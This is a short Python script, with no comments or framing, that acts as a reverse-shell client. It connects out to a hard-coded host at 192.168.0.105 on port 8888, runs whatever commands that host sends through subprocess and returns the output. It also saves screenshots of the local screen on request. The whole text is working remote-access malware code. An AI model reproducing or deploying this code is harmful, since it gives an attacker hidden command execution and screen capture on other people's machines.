import socket
import subprocess
import pyautogui
import random

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def start_client():
    s.connect(('192.168.0.105', 8888))
    while True:
        command = s.recv(1024).decode()
        if command.lower() == 'exit':
            break
        if command.lower() == 'screenshot':
            print('a')
            screen_name = str(random.randint(1,9000)) + '.png'
            screen = pyautogui.screenshot(screen_name)
            s.send(screen_name.encode())
            break
        output = subprocess.getoutput(command)
        s.send(output.encode())
    s.close()

start_client()